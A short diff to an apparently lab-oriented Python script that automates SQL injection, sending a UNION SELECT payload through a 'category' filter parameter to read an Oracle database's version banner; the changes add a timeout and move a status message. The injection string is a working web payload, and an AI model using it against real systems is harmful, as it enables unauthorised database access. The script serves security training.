@@ -33,7 +33,7 @@ def get_db_version(lab_url, session, num_of_columns):
         payload[i] = "banner"
         payload = ",".join(payload)
         url = f"{lab_url}/filter?category=x' UNION SELECT {payload} FROM v$version--"
-        response = session.get(url)
+        response = session.get(url, timeout=10)
         if response.status_code == 200:
             return extract_text(response)
 
@@ -49,12 +49,12 @@ def main():
         session = requests.Session()
         session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
 
+        print("(+) Retrieving database version information...")
         num_of_columns = determine_columns(lab_url, session)
         if not num_of_columns:
             print("(-) Something went wrong. Please check your URL and try again.")
             sys.exit(1)
 
-        print("(+) Retrieving database version information...")
         db_version = get_db_version(lab_url, session, num_of_columns)
         if db_version:
             print(f"(+) Database Version Information: {db_version}")
